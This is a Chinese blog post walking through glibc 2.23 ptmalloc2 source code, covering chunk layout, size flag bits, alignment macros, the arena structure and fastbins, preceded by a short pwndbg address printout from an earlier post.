<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;stack_var</span><br><span class="line">$<span class="number">3</span> = (<span class="type">unsigned</span> <span class="type">long</span> (*)[<span class="number">16</span>]) <span class="number">0x7fffffffd2e0</span></span><br><span class="line">pwndbg&gt; p target</span><br><span class="line">$<span class="number">4</span> = (<span class="type">unsigned</span> <span class="type">long</span> *) <span class="number">0x7fffffffd2f0</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/10/26/malloc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/26/malloc/" class="post-title-link" itemprop="url">glibc2.23 Ptmalloc2 源码分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-10-26 22:03:00 / Modified: 22:04:01" itemprop="dateCreated datePublished" datetime="2023-10-26T22:03:00+08:00">2023-10-26</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="dive-into-ptmalloc2">Dive Into Ptmalloc2</h1>
<p><del>基于glibc2.23的ptmalloc2源码分析</del></p>
<h2 id="datastructure">datastructure</h2>
<h3 id="malloc_chunk">malloc_chunk</h3>
<p>堆空间管理的最小单元</p>
<p>每个堆块由元数据和数据两部分组成</p>
<p>元数据记录了该堆块的物理前块大小,本块大小,分配区,前块使用,是否<code>mmap</code>块状态,以及空闲状态下的前驱后继指针</p>
<p>数据就是返回给用户的可用空间</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="字段意义">字段意义</h4>
<h5 id="prev_size">prev_size</h5>
<p>如果物理上紧挨着的一个<code>chunk</code>空闲的话,则该值为物理上前面紧挨着的那个<code>chunk</code>的大小.</p>
<p>如果物理上紧挨着的一个<code>chunk</code>占用的话,则该值可以被物理上紧挨着的那个<code>chunk</code>使用(空间复用)</p>
<h5 id="size">size</h5>
<p>本chunk的大小,包括chunk头和<code>chunk</code>数据</p>
<blockquote>
<p>其中chunk头就是<code>malloc_chunk</code>结构体,chunk数据就是返回给用户使用的内存空间</p>
</blockquote>
<p>每个<code>chunk</code>的大小都必须是<code>2*SIZE_SZ</code>整数倍</p>
<p>32位系统中size_sz=4,64位系统中size_sz=8</p>
<p>因此32位系统上chunk大小是8的倍数,64位上chunk是16的倍数</p>
<p>诚如是,则size的低3位永远用不到,为了节省空间,ptmalloc的实现中,这三个低位表示三个符号A,M,P</p>
<h5 id="fdbk">fd,bk</h5>
<p>当本chunk空闲并且挂在bin上,此时fd,bk分别是前向和后向chunk的指针,相当于双向链表.</p>
<p>注意是逻辑上相邻,也就是链表相连,不是物理上相邻</p>
<h5 id="fd_nextsizebk_nextsize">fd_nextsize,bk_nextsize</h5>
<p>当chunk空闲并且挂在large bin中时,用于查找最近匹配的空闲chunk</p>
<p>怎么个用法呢?</p>
<p>large
bin中挂着的chunk是按照大小排序的,一个chunk逻辑上相连的chunk可能大小相同,也可能不同,fd_nextsize,bk_nextsize就指向第一个<strong>大小不同</strong>的chunk</p>
<p>这样说比较抽象,具体见后面的largebin结构</p>
<h4 id="空间复用">空间复用</h4>
<h5 id="分配时状态">分配时状态</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> <span class="title function_">unallocated</span> <span class="params">(P clear)</span>  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             <span class="params">(malloc_usable_size() bytes)</span>                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="params">(size of chunk, but used <span class="keyword">for</span> application data)</span>    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<h5 id="空闲时状态">空闲时状态</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">      |             Size of previous chunk                            |</span><br><span class="line">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    `head:<span class="string">&#x27; |             Size of chunk, in bytes                         |P|</span></span><br><span class="line"><span class="string">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">      |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="string">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">      |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="string">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">      |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="string">      .                                                               .</span></span><br><span class="line"><span class="string">      .                                                               |</span></span><br><span class="line"><span class="string">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">    `foot:&#x27;</span> |             Size of chunk, in bytes                           |</span><br><span class="line">      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<h4 id="宏定义">宏定义</h4>
<h5 id="指针转换">指针转换</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))</span></span><br></pre></td></tr></table></figure>
<p>mem就是数据区,chunk就是malloc_chunk的基地址,两者的关系在图上表示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> <span class="title function_">unallocated</span> <span class="params">(P clear)</span>  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             <span class="params">(malloc_usable_size() bytes)</span>                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="params">(size of chunk, but used <span class="keyword">for</span> application data)</span>    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<p>显然mem网上数两个成员就是chunk,这两个成员都是INTERNAL_SIZE_T类型的,在32位平台上分别长4字节,在64位平台上分别长8字节</p>
<h5 id="最小chunk大小">最小chunk大小</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br></pre></td></tr></table></figure>
<p><code>offsetof(struct,struct.member);</code>作用是计算member成员在其所在的结构体struct中的偏移量</p>
<p>这表明最小的chunk至少要包含前四个成员,prev_size,size,fd,bk,后面两个可以没有</p>
<h5 id="最小申请的堆内存大小">最小申请的堆内存大小</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE                                                                \</span></span><br><span class="line"><span class="meta">    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;                   \</span></span><br><span class="line"><span class="meta">                      ~MALLOC_ALIGN_MASK))</span></span><br></pre></td></tr></table></figure>
<h5 id="检查对齐">检查对齐</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if m has acceptable alignment */</span></span><br><span class="line"><span class="comment">// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> misaligned_chunk(p)                                                    \</span></span><br><span class="line"><span class="meta">    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \</span></span><br><span class="line"><span class="meta">     MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure>
<h5 id="判断用户请求是否离谱">判断用户请求是否离谱</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br></pre></td></tr></table></figure>
<h5 id="规范化请求大小">规范化请求大小</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \<span class="comment">//如果用户请求的太小则直接用MINSIZE</span></span></span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)<span class="comment">//否则向上取整到满足对齐要求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure>
<h5 id="设置size最低三位标志位">设置size最低三位标志位</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_inuse(p) ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check for mmap()&#x27;ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for chunk from main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark a chunk as not being on the main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bits to mask off when extracting size</span></span><br><span class="line"><span class="comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span></span><br><span class="line"><span class="comment">   macros for which mmapped chunks should never be seen. This should</span></span><br><span class="line"><span class="comment">   cause helpful core dumps to occur if it is tried by accident by</span></span><br><span class="line"><span class="comment">   people extending or adapting this malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure>
<h5 id="获取本chunk-size">获取本chunk size</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure>
<p>如果想要获得纯真的size,最低三位应该忽略标志位的影响,因此chunksize中用SIZE_BITS取反得到第三位全是0然后按位与,确保获得的size低三位必为0</p>
<p>而chunksize_nomask就没有忽略,相当于直接区的malloc_struct的第二个成员</p>
<h5 id="使用状态">使用状态</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)                                                               \</span></span><br><span class="line"><span class="meta">    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse(p)                                                           \</span></span><br><span class="line"><span class="meta">    ((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size |= PREV_INUSE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse(p)                                                         \</span></span><br><span class="line"><span class="meta">    ((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span></span><br></pre></td></tr></table></figure>
<h5 id="size大小">size大小</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="comment">// SIZE_BITS = 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head_size(p, s)                                                    \</span></span><br><span class="line"><span class="meta">    ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s) ((p)-&gt;mchunk_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_foot(p, s)                                                         \</span></span><br><span class="line"><span class="meta">    (((mchunkptr)((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span></span><br></pre></td></tr></table></figure>
<p>这里set_foot干了啥?</p>
<p>p是chunk指针,s是该chunk的大小,p+s就指向了本chunk的结尾,</p>
<p>也就是下一个chunk的基地址,也就是下一个chunk的prev_size成员,</p>
<p>于是p+s强转为一个malloc_chunk类型指针,</p>
<p>然后取其第一个成员也就是prev_size,写上本chunk的大小</p>
<h5 id="指定偏移处认为是一个chunk">指定偏移处认为是一个chunk</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure>
<p>p指针加上s偏移量的地址视为一个chunk的基地址,返回一个malloc_chunk*指针</p>
<h3 id="malloc_state">malloc_state</h3>
<p>分配区结构,一个进程只能有一个主分配区,可以可以有多个非主分配区</p>
<p>当某个线程试图用<code>malloc</code>动态申请内存时,会首先对一个分配区上锁,如果主分配区忙则沿着<code>malloc_state-&gt;next</code>寻找下一个分配区,直到找到一个闲的分配区上锁使用.如果转一圈没发现闲的分配区则创建新的非主分配区,然后将其加入到这个分配区环状链表中上锁使用.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;<span class="comment">//互斥锁,保证临界区只有一个线程访问</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr      fastbins[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr        top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr        last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr        bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span>     binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line">	...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中管理堆块的手段有fastbin,topchunk,unsortedbin,smallbins,largebins这么几种</p>
<p>只考虑单线程的情况,也就是说不会产生非主分配区,只使用主分配区</p>
<p>最初只有很大一块topchunk,刚开始的malloc申请都是直接在malloc上切割使用</p>
<p>free释放时,如果对应堆块落在fastbin范围内则放到fastbin对应的链表中</p>
<p>否则一律放到unsortedbin中,等后面再次malloc时切割或者合并或者分拣</p>
<h4 id="fastbins">fastbins</h4>
<p>只会使用fd指针的单向链表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">A[&quot;fastbin[x]&quot;]</span><br><span class="line">A--fd--&gt;a--fd--&gt;b--fd--&gt;c</span><br></pre></td></tr></table></figure>
<h5 id="max_fast">max_fast</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> set_max_fast(s) \</span></span><br><span class="line"><span class="meta">  global_max_fast = (((s) == 0)						      \</span></span><br><span class="line"><span class="meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_max_fast() global_max_fast</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> INTERNAL_SIZE_T global_max_fast;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span></span><br><span class="line"><span class="meta">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span></span><br></pre></td></tr></table></figure>
<p>对于x64平台,SIZE_SZ=8,</p>
